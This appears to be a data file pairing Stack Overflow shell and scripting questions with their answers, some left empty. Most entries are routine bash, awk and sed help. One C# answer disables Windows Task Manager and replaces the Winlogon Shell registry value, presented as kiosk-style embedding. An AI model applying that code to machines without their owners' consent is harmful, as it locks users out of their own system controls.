    "shlex alternative for Java": "I had a similar problem today, and it didn't look like any standard options such as StringTokenizer, StrTokenizer, Scanner were a good fit. However, it's not hard to implement the basics.\nThis example handles all the edge cases currently commented on other answers. Be warned, I haven't checked it for full POSIX compliance yet. Gist including unit tests available on GitHub - released in public domain via the unlicense.\npublic List<String> shellSplit(CharSequence string) {\n    List<String> tokens = new ArrayList<String>();\n    boolean escaping = false;\n    char quoteChar = ' ';\n    boolean quoting = false;\n    int lastCloseQuoteIndex = Integer.MIN_VALUE;\n    StringBuilder current = new StringBuilder();\n    for (int i = 0; i<string.length(); i++) {\n        char c = string.charAt(i);\n        if (escaping) {\n            current.append(c);\n            escaping = false;\n        } else if (c == '\\\\' && !(quoting && quoteChar == '\\'')) {\n            escaping = true;\n        } else if (quoting && c == quoteChar) {\n            quoting = false;\n            lastCloseQuoteIndex = i;\n        } else if (!quoting && (c == '\\'' || c == '\"')) {\n            quoting = true;\n            quoteChar = c;\n        } else if (!quoting && Character.isWhitespace(c)) {\n            if (current.length() > 0 || lastCloseQuoteIndex == (i - 1)) {\n                tokens.add(current.toString());\n                current = new StringBuilder();\n            }\n        } else {\n            current.append(c);\n        }\n    }\n    if (current.length() > 0 || lastCloseQuoteIndex == (string.length() - 1)) {\n        tokens.add(current.toString());\n    }\n\n    return tokens;\n}",
    "Combine multiple parameter expansion operations in bash": "You cannot achieve nested parameter expansion in bash shell, though its possible in zsh, so ENV=${ENV^^:-DEFAULT} operation cannot be executed by default.\nYou could use a ternary operator in the form of case construct in bash shell as there is no built-in operator for it (? :)\ncase \"$ENV\" in\n  \"\") ENV=\"default\" ;;\n  *)  ENV=${ENV^^} ;;\nesac\nBut you shouldn't use upper case variable names for user defined shell variables. They are only meant for variables maintained by the system.",
    "run specific command without sudo inside script running with sudo bash": "Note that sudo runs programs as a different user, not necessarily as root; root is just the default. So your goal is probably not to run your specific git command without sudo, but rather to run it as a different user than the rest.\nIf you want you git command to be run by a hard-coded user the_user, just put\nsudo -u the_user <your git command>\nin your script (this will not prompt you for your password when the script is run as root).\nIf you don't know the user in advance but rather want the git command to be run by whoever called sudo newScript use\nsudo -u $SUDO_USER <your git command>\ninstead (thanks to @thatotherguy for that hint).",
    "Programmatically change the Windows Shell": "After much searching of other locations on the net, I have finally got the Shell to change to the executable file of the application that is being built.\nThe \"Embedding\" process is a three step process, in the case of the software I'm working on, we start by disabling Task Manager, We then set the shell executable in the Local Machine registry and then repeat the process in the Current User registry.\nBelow is the code that achieves this:\npublic void embedSoftware()\n{\n    try\n    {\n        // Disable Task Manager\n        regKey = Registry.CurrentUser.OpenSubKey(subKey, true).CreateSubKey(\"System\");\n        regKey.SetValue(\"DisableTaskMgr\", 1);\n        regKey.Close();\n        // Change the Local Machine shell executable\n        regKey = Registry.LocalMachine.OpenSubKey(@\"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\", true);\n        regKey.SetValue(\"Shell\", shell, RegistryValueKind.String);\n        regKey.Close();\n        // Create the Shell executable Registry entry for Current User\n        regKey = Registry.CurrentUser.OpenSubKey(@\"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\", true);\n        regKey.SetValue(\"Shell\", shell);\n        regKey.Close();\n        MessageBox.Show(\"Embedding Complete\");\n\n    }\n    catch (Exception e)\n    {\n        MessageBox.Show(e.Message);\n    }\n}\nIn this example the variable \"shell\" is a string containing the path of the executable to use as the new Windows Shell.\nFurther to this there's a method to \"un-embed\" the software, this method simply deletes the \"DisableTaskMgr\" and \"Shell\" values from the Current User registries, it also resets the \"Shell\" value in the Local Machine registry to \"explorer.exe\".\nI hope this helps others out there who're having trouble changing Windows Shells programmatically.\nRegards,\nRichard",
    "How to enable shell command completion for gcloud?": "",
    "Windows terminal/Console/shell in Vi mode?": "I would recommend you to try PowerShell version 3+ and PSReadLine module. It does support vi mode as of version 1.2, and emacs mode for a while now (it was there already when I started playing with it).",
    "Background spawned process in Expect": "I had the same problem and figured this out.\nWhen expect exits, it sends a SIGHUP (hangup signal) to the spawned subprocess. By default, this SIGHUP causes termination of the spawned process.\nIf you want the underlying process not to die from SIGHUP you have two easy options. Both work well:\n1) Ask expect to make the underlying process ignore SIGHUP in the spawn line like this:\n#!/usr/bin/expect -f\n...\nspawn -ignore HUP command args...\n...\nexpect_background\n2) Do it yourself - ignore SIGHUP in the underlying process itself:\nHere's working script demonstrating method 2:\n#!/usr/bin/expect -f\n#\n# start a process and background it after it reaches a certain stage\n#\nspawn perl -e \"\\$SIG{HUP} = 'IGNORE'; for (\\$a='A';; \\$a++) {print qq/value is \\$a\\\\n/; sleep 1;}\"\n\nset timeout 600\n\n# Detailed log so we can debug (uncomment to enable)\n# exp_internal -f /tmp/expect.log 0\n\n# wait till the subprocess gets to \"G\"\nexpect -ex \"value is G\"\n\nsend_user \"\\n>>> expect: got G\\n\"\n\n# when we get to G, background the process\nexpect_background\n\nsend_user \">>> spawned process backgrounding successful\\n\"\nexit 0\nHere's a running example:\n$ ./expect-bg\nspawn perl -e $SIG{HUP} = 'IGNORE'; for ($a='A';; $a++) {print qq/value is $a\\n/; sleep 1;}\nvalue is A\nvalue is B\nvalue is C\nvalue is D\nvalue is E\nvalue is F\nvalue is G\n\n>>> expect: got G\n>>> spawned process backgrounding successful\nAnd as expected in ps output, the perl process is backgrounded and alive.\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nhankm     6700  0.0  0.0  17696  2984 ?        Ss   18:49   0:00 perl -e $SIG{HUP} = 'IGNORE'; for ($a='A';; $a++) {print qq/value is $a\\n/; sleep 1;}",
    "How to make rsync read SRC from STDIN?": "This is right, it doesn't work this way. It is because rsync is made to transfer complete file trees from A to B.\nBecause of the way rsync works, it cannot work, because rsync calculates several checksums before choosing to transfer a particular file (or parts of it), and doing so in only 2 iterations (ping-pong-steps).\nThat means a file has to be read several times. That would not work with a (potentially large) SQL dump because it would have to be buffered somehow. And this buffering is up to the user.\nActually storing the file should be the best workaround, especially if it is a file which only gets gradual differences.",
    "how to start django shell with ipython in qtconsole mode?": "The docs here say:\nIf you'd rather not use manage.py, no problem. Just set the DJANGO_SETTINGS_MODULE environment variable to mysite.settings and run python from the same directory manage.py is in (or ensure that directory is on the Python path, so that import mysite works).\nSo it should be enough to set that environment variable and then run ipython qtconsole. You could make a simple script to do this for you automatically.",
    "Ignore empty results for xargs in Mac OS X": "Indeed, the BSD implementation of xargs doesn't have the -r flag (--no-run-if-empty). The GNU version in Linux has it.\nHere's one way to work around the issue in a way that works in both Linux and BSD:\n... | (grep -v ^deploy || echo :) | xargs svn revert\nThe grep ... || echo : in the middle will generate a line with a : in it in case the output of grep is empty. It's a bit dirty, because xargs will still run the command svn revert :. If your repository doesn't contain the file : then this should have no effect, so it can be acceptable. The : could be anything else, as long as there is no such file in your repository.\nFinally, as @tripleee pointed out, the grep ... || echo : must be enclosed within (...), because:\nthe || has higher precedence than |, and thus terminates the (first) pipeline.\nYour code looks like a Python string. It will be more readable this way:\nkwargs = {\n  'svn': svn_command,\n  'dir': checkout_dir,\n  'revno': options.revision,\n}\ncmd = \"cd {dir} && {svn} st | awk -v r=1 '$2 ! ~ /deploy/ {{ print $2; r=0 }} END {{ r || print \\\":\\\" }}' | xargs {svn} revert && {svn} up -r {revno}\".format(**kwargs)\nI made some changes to your original:\nMoved the logic of the grep inside awk, as @tripleee suggested. Notice that since the grep hack is not needed anymore, there is also no more need to wrap within (...)\nDropped the tac, as I don't see the point in it\nDropped the -R from svn revert, because I don't think you need it",
    "Mysterious LINENO in bash trap ERR": "Some relevant facts/background info:\nTraps on ERR are not inherited by shell functions even though they get the rest of the environment, unless errtrace is set.\nThe exit status of a function is that of its last command.\nMy guess as to what is happening:\nIn the case where both traps are active,\nThe nonexistent command triggers the ERR trap in the function. LINENO is that of the nonexistent command.\nThe trap finishes executing. Since the nonexistent command was the last command, the return status of the function is nonzero, so the ERR trap in the shell is triggered. LINENO is still set to the last line of traperror since it was the last line to execute and is still the current line, as no new line has been executed yet.\nIn the case where only the shell trap is active (the one in the function is commented out)\nThe nonexistent command is the last command in the function, so causes the function to return non-zero, thus causing the shell's ERR trap to trigger. For the same reason above, LINENO is the last line of the function as it was the last line to execute and is still the current line.",
    "Why are empty arrays treated as unset in bash?": "This isn't specific to Bash running under WSL or not, but depends on the Bash version.\nThe behaviour has been reported as a bug for Bash 4.1, but was considered intended behaviour. Chet also points out that the different behaviour for $@ and $* is because POSIX mandates it. The recommended workaround back then, similar to Andy's comment, was:\necho ${argv[0]+\"${argv[@]}\"}\nwhich expands to \"${argv[@]}\" if argv is set, and nothing otherwise (notice the outer expansion being unquoted).\nIn Bash 4.4, the behaviour changed, as documented in CHANGES, from bash-4.4-beta2 to bash-4.4-rc2, as a \"new feature\":\nUsing ${a[@]} or ${a[*]} with an array without any assigned elements when the nounset option is enabled no longer throws an unbound variable error.",
    "Is there a way to add a prompt during the docker build process?": "Well, after searching around, there's not way to have a prompt during a docker build. It has been designed to be fully automated.\nI'll do this step during the docker run then.\nThanks to a certain larsks on the IRC #docker group, there's an interesting read about these issues at https://github.com/GoogleCloudPlatform/kubernetes/issues/2030",
    "Error: sys/wait.h: No such file or directory [duplicate]": "From http://sourceforge.net/p/dev-cpp/discussion/48211/thread/e32720b4\nTextTiling/util.c:8:22: sys/wait.h: No such file or directory TextTiling/util.c:26:21: sys/vfs.h: No such file or directory\nThese are OS specific files, but are not Windows headers. Windows does not fully support POSIX APIs. You will probably have to do some porting of the code to get it to compile and run on Windows.\nYou will probably have more luck building it in its intended environment (Linux or OSX perhaps, either way a UNIX-like environment). You might be able to build it under Cygwin, but that is a sledgehammer for a nut.\nA simple(ish) solution is to run Linux under a Virtual Machine (using VMWare's free VMPlayer or VMServer tools for example). And then build and run teh code in a VM. The VM can access the Windows machine via a virtual network, so you can still get results and data uinto the Windows environment if you wish.\nOn a diferent issue, Dev-C++ will sometimes (and apparently randomly) fail when projects are in sub-folders of its installation directory (C:\\Dev-Cpp).",
    "Combine output of two concurrent programs with bash": "Great question! This one had me stumped for a bit but I think I know what's going on. What's happening is that grep is buffering the output. So, if you let it run you'll see it all flood at the end. If you happen to be using GNU grep try passing the --line-buffered option:\n(foo bar | grep --line-buffered bar & foo baz &) | tee /tmp/output\nTo hazard a guess, and mind you that's essentially what it is, I'd say that grep is buffering more output because isatty(1) would indicate that it's not writing to a TTY (even though you are watching the output on a TTY via tee). By buffering more output it makes fewer write() calls, and is more efficient. The familiar behavior of running grep and watching the output in a terminal is line buffered -- lines appear as they're found. This option forces grep to run in that mode.\nKeep in mind, as the man page warns, this could have performance impacts on grep.",
    "tmux split-window using shell script": "Try this, it looks like it does what you need (judging by the \"Desired Output\" image):\ntmux split-window -h\ntmux split-window -h\ntmux select-layout even-horizontal\ntmux split-window -v\ntmux select-pane -t 0\nYou can also try persisting your layout using something like https://github.com/tmux-plugins/tmux-resurrect.",
    "Is there an equivalent to 'adb shell input keyboard text' for iOS?": "",
    "How to unlock system keychain in OS X using terminal": "",
    "How to control bluetooth operations using adb shell?": "",
    "Add a newline only if it doesn't exist": "sed\nGNU:\nsed -i '$a\\' *.txt\nOS X:\nsed -i '' '$a\\' *.txt\n$ addresses the last line. a\\ is the append function.\nOS X's sed\nsed -i '' -n p *.txt\n-n disables printing and p prints the pattern space. p adds a missing newline in OS X's sed but not in GNU sed, so this doesn't work with GNU sed.\nawk\nawk 1\n1 (the number one) can be replaced with anything that evaluates to true. Modifying a file in place:\n{ rm file;awk 1 >file; }<file\nbash\n[[ $(tail -c1 file) && -f file ]]&&echo ''>>file\nTrailing newlines are removed from the result of the command substitution, so $(tail -c1 file) is empty only if file ends with a linefeed or is empty. -f file is false if file is empty. [[ $x ]] is equivalent to [[ -n $x ]] in bash.",
    "How to remove last directory from a path with sed?": "you don't have to use external tools\n$ a=\"/dir1/dir2/dir3/dir4\"\n$ echo ${a%/*}",
    "Redirect only the last line of STDOUT to a file": "Just pipe stdout through tail -n 1 to your file",
    "Multiple conditions in if statement shell script [duplicate]": "if using /bin/sh you can use:\nif [ <condition> ] && [ <condition> ]; then\n    ...\nfi\nif using /bin/bash you can use:\nif [[ <condition> && <condition> ]]; then\n    ...\nfi",
    "How can I use adb to uninstall an APK from multiple connected devices? [duplicate]": "",
    "I would like to store all command-line arguments to a Bash script into a single variable": "If you want to avoid having $IFS involved, use $@ (or don't enclose $* in quotes)\n$ cat atsplat\nIFS=\"_\"\necho \"     at: $@\"\necho \"  splat: $*\"\necho \"noquote: \"$*\n\n$ ./atsplat this is a test\n     at: this is a test\n  splat: this_is_a_test\nnoquote: this is a test\nThe IFS behavior follows variable assignments, too.\n$ cat atsplat2\nIFS=\"_\"\natvar=$@\nsplatvar=$*\necho \"     at: $atvar\"\necho \"  splat: $splatvar\"\necho \"noquote: \"$splatvar\n\n$ ./atsplat2 this is a test\n     at: this is a test\n  splat: this_is_a_test\nnoquote: this is a test\nNote that if the assignment to $IFS were made after the assignment of $splatvar, then all the outputs would be the same ($IFS would have no effect in the \"atsplat2\" example).",
    "How delete file from fortran code?": "Why not let Fortran do the work for you? This code is portable (compare cup's comment):\nopen(unit=1234, iostat=stat, file=file, status='old')\nif (stat == 0) close(1234, status='delete')",
    "libssl.so.10: cannot open shared object file: No such file or directory": "On CentOS 8 the missing lib is included in the compat-openssl10 package, just run:\nyum install compat-openssl10\nAnd all works fine...",
    "difference between number in the same column using AWK": "Try the following code :\nawk '\n    NR == 1{old = $1; next}     # if 1st line \n    {print $1 - old; old = $1}  # else...\n' file.txt\n1\n2\n0\n6\nexplanations\nNR is the ordinal number of the current record from the start of input. Inside a BEGIN action the value shall be zero. Inside an END action the value shall be the number of the last record processed.\nnext statement shall cause all further processing of the current input record to be abandoned. The behavior is undefined if a next statement appears or is invoked in a BEGIN or END action.",
    "How to set up a proxy via bash shell?": "You can put this in your .profile or .bash_profile or run manually on a command line:\nexport http_proxy=http://proxy.server.com:@aproxy:portnumber\nexport https_proxy=https://proxy.server.com:@aproxy:portnumber\nIt's also common to not use the proxy for the local connections\nexport no_proxy=localhost,127.0.0.0/8,*.local",
    "How can a C/C++ program put itself into background?": "My advice: don't do this, at least not under Linux/UNIX.\nGUI programs under Linux/UNIX traditionally do not auto-background themselves. While this may occasionally be annoying to newbies, it has a number of advantages:\nMakes it easy to capture standard error in case of core dumps / other problems that need debugging.\nMakes it easy for a shell script to run the program and wait until it's completed.\nMakes it easy for a shell script to run the program in the background and get its process id:\ngui-program &\npid=$!\n# do something with $pid later, such as check if the program is still running\nIf your program forks itself, this behavior will break.\n\"Scriptability\" is useful in so many unexpected circumstances, even with GUI programs, that I would hesitate to explicitly break these behaviors.\nWindows is another story. AFAIK, Windows programs automatically run in the background--even when invoked from a command shell--unless they explicitly request access to the command window.",
    "Print a comma except on the last line in Awk": "Single pass approach:\ncat \"$a\" | # look, I can use this in a pipeline! \n  awk 'NR > 1 { printf(\", \") } { printf(\"%s-%s\", $1, $2) }'\nNote that I've also simplified the string formatting.",
    "Shell script variable replacing characters": "you can replace without calling external commands (using bash)\n$ var='abcde$$$$$$$$fff$$gg'\n$ echo \"${var//$/ }\"\nabcde        fff  gg\nNote that you should use single quotes so that the \"$\" sign does not get interpolated",
    "GitHub error \"fatal: bad config file line 1 in .git/config\" when in git shell": "I solved this by\nopen .git/config file\nclear all the NULL values in the file\nsave and close the file\ngit add .",
    "How to get the last lines of a file except the first 20?": "Try\ntail -n +21 myfile.txt",
    "How to kill nodemon process on mac? [closed]": "https://github.com/remy/nodemon/issues/1386\nTo work around the issue, find the proces running on the port number and kill it:\n kill -9 $(lsof -t -i:3000)   \nOR\nInstall 1.17.5 npm install nodemon@1.17.5 --save-dev --save-exact.",
    "Multiplication with expr in shell script": "Your code has many problems. Here is a fix. * means \"all files in the current directory\". To instead mean a literal asterisk/multiplication character, you have to escape it:\n./calculator 3 \\* 2\nor\n./calculator 3 \"*\" 2\nYou also have to double quote \"$2\", otherwise * will start meaning \"all files\" again:\n#!/bin/bash\n#Calculator\n#if [ `id -u` != 0 ]; then\n#  echo \"Only root may run this program.\" ; exit 1\n#fi\nif [ $# != 3 ]; then   \n  echo \"You did not run the program correctly\"\n  echo \"Example:  calculator 4 + 5\"\n  exit 1\nfi\n# Now do the math (note quotes)\nif [ \"$2\" = \"+\" ]; then echo `expr $1 + $3`\nelif [ \"$2\" = \"-\" ]; then echo `expr $1 - $3`\nelif [ \"$2\" = \"*\" ]; then echo `expr $1 \\* $3`\nelif [ \"$2\" = \"/\" ]; then echo `expr $1 / $3`\nfi\nexit 0",
    "shell-scripting: Use a pipe as an input for tar": "I don't see how \"tar\" figures into this at all; why not just compress the dump file itself?\npg_dump -U myUser myDB | gzip > myDB.sql.gz\nThen, to restore:\ngzip -cd myDB.sql.gz | pg_restore ...\nThe \"tar\" utility is for bundling up a bunch of files and directories into a single file (the name is a contraction of \"tape archive\"). In that respect, a \"tar\" file is kind-of like a \"zip\" file, except that \"zip\" always implies compression while \"tar\" does not.\nNote finally that \"gzip\" is not \"zip.\" The \"gzip\" utility just compresses; it doesn't make archives.",
    "How to auto start an application in openwrt?": "Make sure the first line of your script reads:\n#!/bin/sh /etc/rc.common\nCopy your script to the /etc/init.d/ directory\nMake sure the execute bit is on\nchmod +x /etc/init.d/<your script>\nEnable your script\n/etc/init.d/<your script> enable\nYour script should now have a symlink in /etc/rc.d/\nls -lh /etc/rc.d | grep <your script>\nConfirm your init script is enabled:\n/etc/init.d/<your script> enabled && echo on\nIf this command returns on, then you're all set. If this command doesn't return anything, then your script isn't enabled. Here's an example of a script that's enabled:\nroot@OpenWrt:~# /etc/init.d/system enabled && echo on\non\nI've tested these steps on OpenWrt Chaos Calmer 15.05 but it should work on earlier versions. Good luck!",
    "How to read a file and copy from one file to another file in shell script": "if you want to copy entire file as it is then\ncat filename >> newfilename\nfor three files\ncat file1.txt file2.txt file3.txt >>file.txt\nif you want to copy line by line then\nwhile IFS= read -r line\ndo\necho \"$line\"\necho -e \"$line\\n\" >>newfilename\n\ndone <\"filename\"",
    "Display all fields except the last": "Both these sed and awk solutions work independent of the number of fields.\nUsing sed:\n$ sed -r 's/(.*)\\..*/\\1/' file\n1.2.3.4\nsanma.nam\nc.d.b\nNote: -r is the flag for extended regexp, it could be -E so check with man sed. If your version of sed doesn't have a flag for this then just escape the brackets:\nsed 's/\\(.*\\)\\..*/\\1/' file\n1.2.3.4\nsanma.nam\nc.d.b\nThe sed solution is doing a greedy match up to the last . and capturing everything before it, it replaces the whole line with only the matched part (n-1 fields). Use the -i option if you want the changes to be stored back to the files.\nUsing awk:\n$ awk 'BEGIN{FS=OFS=\".\"}{NF--; print}' file\n1.2.3.4\nsanma.nam\nc.d.b\nThe awk solution just simply prints n-1 fields, to store the changes back to the file use redirection:\n$ awk 'BEGIN{FS=OFS=\".\"}{NF--; print}' file > tmp && mv tmp file",
    "Prepend data from one file to another": "The following command will take the two files and merge them into one\ncat file1.txt file2.txt > file3.txt; mv file3.txt file2.txt",
    "how to Find a substring in a bash shell script variable": "LIST=\"some string with a substring you want to match\"\nSOURCE=\"substring\"\n\nif echo \"$LIST\" | grep -q \"$SOURCE\"; then\n    echo \"matched\";\nelse\n    echo \"no match\";\nfi\nGood Luck ;)",
    "How to print $ in shell script?": "You can use:\nmsg1='$'\nms=\"${msg1}msg1\"\nmsg2=\"$ms two\"\nmsg3=\"$msg2 three\"\necho \"$msg3\"\nOUTPUT:\n$msg1 two three\nPS: Take note of ${msg1} syntax to create variable boundary around msg1. This is used to avoid it making it $msg1msg1",
    "Trying to split a string into two variables": "This is a bug in Bash 4.2. See chepner's answer for a proper explanation.\nIt is about quotes. Use:\nIFS=':' read var1 var2 <<< \"$var\"\n                           ^    ^\ninstead of\nIFS=':' read var1 var2 <<< $var\nSee result:\n$ IFS=':' read var1 var2 <<< \"$var\"\n$ echo \"var1=$var1, var2=$var2\"\nvar1=hello, var2=world\nBut\n$ IFS=':' read var1 var2 <<< $var\n$ echo \"var1=$var1, var2=$var2\"\nvar1=hello world, var2=",
    "Why doesn't my 'find' work like I expect using -exec?": "You shouldn't put the rm -rf {} in single quotes.\nAs you've quoted it the shell is treating all of the arguments to -exec it as a command rather than a command plus arguments, so it's looking for a file called \"rm -rf ./src/.svn\" and not finding it.\nTry:\nfind . -iname .svn -exec rm -rf {} \\;",
    "How do I preserve leading whitespaces with echo on a shell script?": "The leading spaces are removed because read splits the input into words. To counter this, set the IFS variable to empty string. Like this:\nOLD_IFS=\"$IFS\"\nIFS=\nwhile read line         \ndo\n    ...\ndone <$filePath/sourcefile\nIFS=\"$OLD_IFS\"",
    "How to create multiple files with random data with bash": "You can do it with a shell for loop:\nfor i in {1..20000}; do dd if=/dev/urandom bs=1 count=1 of=file$i; done\nAdjust count and bs as necessary to make files of the size you care about. Note that I changed to /dev/urandom to prevent blocking.\nYou can add some >/dev/null 2>&1 to quiet it down, too.",
    "Floating-point arithmetic in UNIX shell script": "I believe you should use : bc\nFor example:\necho \"scale = 10; 123.456789/345.345345\" | bc\n(It's the unix way: each tool specializes to do well what they are supposed to do, and they all work together to do great things. don't emulate a great tool with another, make them work together.)\nOutput:\n.3574879198\nOr with a scale of 1 instead of 10:\necho \"scale = 1; 123.456789/345.345345\" | bc\nOutput:\n.3\nNote that this does not perform rounding.\nI highly recommand switching to awk if you need to do more complex operations, or perl for the most complex ones.\nex: your operations done with awk:\n# create the test file:\nprintf '1.5493482,3.49384,33.284732,23.043852,2.2384,12.1,13.4,...\\n' > somefile\nprintf '3.384,3.282342,23.043852,2.23284,8.39283,14.1,15.2,...\\n'    >> somefile\n\n# do OP's calculations (and DEBUG print them out!)\n\nawk -F',' '\n   # put no single quote in here... even in comments! you can instead print a: \\047 \n   # the -F tell awk to use \",\" as a separator. Thus awk will automatically split lines for us using it. \n   # $1=before first \",\"  $2=between 1st and 2nd \",\"  ... etc.\n    function some_awk_function_here_if_you_want() {  # optionnal function definition\n         # some actions here. you can even have arguments to the function, etc.\n         print \"DEBUG: no action defined in some_awk_function_here_if_you_want yet ...\"\n    }\n    \n    BEGIN      {  rem=\"Optionnal START section. here you can put initialisations, that happens before the FIRST file-s FIRST line is read\"\n    }\n    \n    (NF>=8)    {  rem=\"for each line with at least 8 values separated by commas (and only for lines meeting that condition)\"\n                  calc1=($2 - $7)\n                  calc2=($3 * $2)\n                  calc3=($2 - $1)\n                  calc4=($2 + $8)\n                  # uncomment to call this function :(ex1): #  some_awk_function_here_if_you_want\n                  # uncomment to call this script:(ex2): # cmd=\"/path/to/some/script.sh \\\"\" calc1 \"\\\" \\\"\" calc2 \"\\\" ...\" ; rem=\"continued next line\"\n                  # uncomment to call this script:(ex2): # system(cmd); close(cmd) \n                  line_no=(FNR-1) # ? why -1? .  FNR=line number in the CURRENT file.   NR=line number since the beginning (NR>FNR after the first file ...)\n                  print \"DEBUG: calc1=\" calc1 \" , calc2=\" calc2 \" , calc3=\" calc3 \" , calc4=\" calc4 \" , line_no=\" line_no\n                  print \"DEBUG fancier_exemples: see man printf for lots of info on formatting (%...f for floats, %...d for integer, %...s for strings, etc)\"\n                  printf(\"DEBUG: calc1=%d , calc2=%10.2f , calc3=%s , calc4=%d , line_no=%d\\n\",calc1, calc2, calc3, calc4, line_no)\n    }\n\n    END        {  rem=\"Optionnal END section. here you can put things that need to happen AFTER the LAST file-s LAST line is read\"\n    }\n      \n'  somefile # end of the awk script, and the list of file(s) to be read by it.",
    "Explain the deviousness of the Perl \"preamble\"": "The idea is that those three lines do 3 different things if they're evaluated in a standard Bourne shell (sh), a C shell (csh), or Perl. This hack is only needed on systems that don't support specifying an interpreter name using a #! line at the start of a script. If you execute a Perl script beginning with those 3 lines as a shell script, the shell will launch the Perl interpreter, passing it the script's filename and the command line arguments.\nIn Perl, the three lines form one statement, terminated by the ;, of the form\neval '...' && eval '...' & eval '...' if $running_under_some_shell;\nSince the script just started, $running_under_some_shell is undef, which is false, and the evals are never executed. It's a no-op.\nThe devious part is that $?0 is parsed differently in sh versus csh. In sh, that means $? (the exit status of the last command) followed by 0. Since there is no previous command, $? will be 0, so $?0 evaluates to 00. In csh, $?0 is a special variable that is 1 if the current input filename is known, or 0 if it isn't. Since the shell is reading these lines from a script, $?0 will be 1.\nTherefore, in sh, eval '(exit $?0)' means eval '(exit 00)', and in csh it means eval '(exit 1)'. The parens indicate that the exit command should be evaluated in a subshell.\nBoth sh and csh understand && to mean \"execute the previous command, then execute the following command only if the previous command exited 0\". So only sh will execute eval 'exec perl -wS $0 ${1+\"$@\"}'. csh will proceed to the next line.\ncsh will ignore \"& \" at the beginning of a line. (I'm not sure exactly what that means to csh. Its purpose is to make this a single expression from Perl's point of view.) csh then proceeds to evaluate eval 'exec /usr/bin/perl -wS $0 $argv:q'.\nThese two command lines are quite similar. exec perl means to replace the current process by launching a copy of perl. -wS means the same as -w (enable warnings) and -S (look for the specified script in $PATH). $0 is the filename of the script. Finally both ${1+\"$@\"} and $argv:q produce a copy of the current command line arguments (in sh and csh, respectively).\nIt uses ${1+\"$@\"} instead of the more usual \"$@\" to work around a bug in some ancient version of the Bourne shell. They mean the same thing. You can read the details in Bennett Todd's explanation (copied in gbacon's answer).",
    "ffmpeg not working after update to Mavericks": "My solution after some fiddling.\nbrew uninstall ffmpeg\nbrew doctor\nthen it told me i had an unlinked ffmpeg and i had some dependencies\nbrew install faac lame xvid\nbrew doctor\nthen it told me i JUST had an unlinked item.\nbrew install ffmpeg\nand it worked.",
    "\"let\" internal shell command doesn't work in a shell script?": "Do not use let. Use POSIX arithmetic expansion: a=$(($a+1)). This is guaranteed to work in any POSIX-compliant shell.",
    "What is the general syntax of a Unix shell command?": "These days, the POSIX standard using getopt() (aka getopt(3)) is widely used as a standard notation, but in the early days, people were experimenting. On some machines, the sort command no longer supports the + notation. However, various commands (notably ar and tar) accept controls without any prefix character - and dd (alluded to by Alok in a comment) uses another convention altogether.\nThe GNU convention of using '--' for long options (supported by getopt_long(3)) was changed from using '+'. Of course, the X11 software uses a single dash before multi-character options. So, the whole thing is a collection of historic relics as people experimented with how best to handle it.\nPOSIX documents the Utility Conventions that it works to, except where historical precedent is stronger.\nWhat styles of option handling are there?\n[At one time, SO 367309 contained the following material as my answer. It was originally asked 2008-12-15 02:02 by FerranB, but was subsequently closed and deleted.]\nHow many different types of options do you recognize? I can think of many, including:\nSingle-letter options preceded by single dash, groupable when there is no argument, argument can be attached to option letter or in next argument (many, many Unix commands; most POSIX commands).\nSingle-letter options preceded by single dash, grouping not allowed, arguments must be attached (RCS).\nSingle-letter options preceded by single dash, grouping not allowed, arguments must be separate (pre-POSIX SCCS, IIRC).\nMulti-letter options preceded by single dash, arguments may be attached or in next argument (X11 programs; also Java and many programs on Mac OS X with a NeXTSTEP heritage).\nMulti-letter options preceded by single dash, may be abbreviated (Atria Clearcase).\nMulti-letter options preceded by single plus (obsolete).\nMulti-letter options preceded by double dash; arguments may follow '=' or be separate (GNU utilities).\nOptions without prefix/suffix, some names have abbreviations or are implied, arguments must be separate. (AmigaOS Shell)\nFor options taking an optional argument, sometimes the argument must be attached (co -p1.3 rcsfile.c), sometimes it must follow an '=' sign. POSIX doesn't support optional arguments meaningfully (the POSIX getopt() only allows them for the last option on the command line).\nAll sensible option systems use an option consisting of double-dash ('--') alone to mean \"end of options\" \u2014 the following arguments are \"non-option arguments\" (usually file names; POSIX calls them 'operands') even if they start with a dash. (I regard supporting this notation as an imperative. Be aware that if the -- is preceded by an option requiring an argument, the -- will be treated as the argument to the option, not as the 'end of options' marker.)\nMany but not all programs accept single dash as a file name to mean standard input (usually) or standard output (occasionally). Sometimes, as with GNU 'tar', both can be used in a single command line:\n... | tar -cf - -F - | ...\nThe first solo dash means 'write to stdout'; the second means 'read file names from stdin'.\nSome programs use other conventions \u2014 that is, options not preceded by a dash. Many of these are from the oldest days of Unix. For example, 'tar' and 'ar' both accept options without a dash, so:\ntar cvzf /tmp/somefile.tgz some/directory\nThe dd command uses opt=value exclusively:\ndd if=/some/file of=/another/file bs=16k count=200\nSome programs allow you to interleave options and other arguments completely; the C compiler, make and the GNU utilities run without POSIXLY_CORRECT in the environment are examples. Many programs expect the options to precede the other arguments.\nNote that git and other VCS commands often use a hybrid system:\ngit commit -m 'This is why it was committed'\nThere is a sub-command as one of the arguments. Often, there will be optional 'global' options that can be specified between the command and the sub-command. There are examples of this in POSIX; the sccs command is in this category; you can argue that some of the other commands that run other commands are also in this category: nice and xargs spring to mind from POSIX; sudo is a non-POSIX example, as are svn and cvs.\nI don't have strong preferences between the different systems. When there are few enough options, then single letters with mnemonic value are convenient. GNU supports this, but recommends backing it up with multi-letter options preceded by a double-dash.\nThere are some things I do object to. One of the worst is the same option letter being used with different meanings depending on what other option letters have preceded it. In my book, that's a no-no, but I know of software where it is done.\nAnother objectionable behaviour is inconsistency in style of handling arguments (especially for a single program, but also within a suite of programs). Either require attached arguments or require detached arguments (or allow either), but do not have some options requiring an attached argument and others requiring a detached argument. And be consistent about whether '=' may be used to separate the option and the argument.\nAs with many, many (software-related) things \u2014 consistency is more important than the individual decisions. Using tools that automate and standardize the argument processing helps with consistency.\nWhatever you do, please, read the TAOUP's Command-Line Options and consider Standards for Command Line Interfaces. (Added by J F Sebastian \u2014 thanks; I agree.)",
    "How to custom display prompt in KornShell to show hostname and current directory?": "From reading the ksh man page you want\nPS1=\"${HOSTNAME}:\\${PWD##*/} \\$ \"\nTested on default ksh on SunOS 5.8",
    "Problem executing \"minikube start\" command": "You might have a minikube VM that has an old version or/and minikube cannot connect to. You can try deleting the VM and/or wipe out ~/.minikube\n$ minikube delete\n$ rm -rf ~/.minikube\nIf that doesn't work then you have a problem with VirtualBox. Uninstall/Re-install",
